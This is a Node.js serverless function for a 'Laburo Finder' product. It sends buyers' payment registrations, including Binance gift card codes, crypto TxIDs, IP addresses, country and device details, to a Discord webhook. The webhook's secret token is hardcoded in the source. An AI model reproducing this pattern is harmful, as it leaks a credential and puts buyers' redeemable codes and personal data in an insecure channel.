const https = require('https');

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1539060486090522675/toaM2whq62CXtM0nFy3g6kuwkqKkzPUBpUwY8wqIgUd8ewSJebmmQ2a7pmZlIbQ8n9IT';

function sendDiscord(data) {
  if (!DISCORD_WEBHOOK_URL) return Promise.resolve();

  const url = new URL(DISCORD_WEBHOOK_URL);

  let detallesFormatted = 'Ninguno';
  if (data.detallesPago) {
    if (data.detallesPago.codigoBinance) detallesFormatted = `GiftCard Binance: ${data.detallesPago.codigoBinance}`;
    else if (data.detallesPago.txId) detallesFormatted = `TxID Cripto: ${data.detallesPago.txId}`;
    else if (data.detallesPago.nota) detallesFormatted = `Nota: ${data.detallesPago.nota}`;
  }

  const payload = JSON.stringify({
    username: 'Laburo Finder',
    embeds: [{
      title: '💳 Nuevo registro de pago',
      description: [
        `**Discord:** ${data.discord || 'Sin nombre'}`,
        `**Producto:** ${data.producto || 'Producto Digital'}`,
        `**Método de Pago:** ${data.metodoPago || 'PayPal'}`,
        `**Detalles / GiftCard:** ${detallesFormatted}`,
        `**IP:** ${data.ip || 'unknown'}`,
        `**País:** ${data.emoji || '🌍'} ${data.country || 'Desconocido'}`,
        `**Dispositivo:** ${data.platform || 'unknown'} (${data.userAgent || 'unknown'})`,
        `**Hora:** ${new Date().toLocaleString('es-ES')}`
      ].join('\n'),
      color: 3066993,
      timestamp: new Date().toISOString()
    }]
  });

  return new Promise((resolve) => {
    const req = https.request({
      hostname: url.hostname,
      path: `${url.pathname}${url.search}`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Laburo-Finder'
      }
    }, (res) => {
      res.resume();
      resolve();
    });

    req.on('error', () => resolve());
    req.write(payload);
    req.end();
  });
}

exports.handler = async function (event) {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ ok: false, message: 'Method not allowed' })
    };
  }

  let body = {};
  try {
    body = JSON.parse(event.body || '{}');
  } catch (error) {
    body = {};
  }

  const discord = String(body.discord || '').trim();
  if (!discord) {
    return {
      statusCode: 400,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ok: false, message: 'Falta el nombre de Discord.' })
    };
  }

  const data = {
    ip: body.ip || 'unknown',
    country: body.country || 'Desconocido',
    countryCode: body.countryCode || 'XX',
    emoji: body.emoji || '🌍',
    userAgent: body.userAgent || 'unknown',
    platform: body.platform || 'unknown',
    language: body.language || 'unknown',
    timezone: body.timezone || 'unknown',
    referrer: body.referrer || 'direct',
    href: body.href || 'unknown',
    screen: body.screen || 'unknown',
    colorDepth: body.colorDepth || 'unknown',
    hardwareConcurrency: body.hardwareConcurrency || 'unknown',
    discord,
    producto: body.producto,
    metodoPago: body.metodoPago,
    detallesPago: body.detallesPago
  };

  await sendDiscord(data);

  return {
    statusCode: 200,
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      ok: true,
      message: 'Solicitud de pago registrada correctamente.'
    })
  };
};
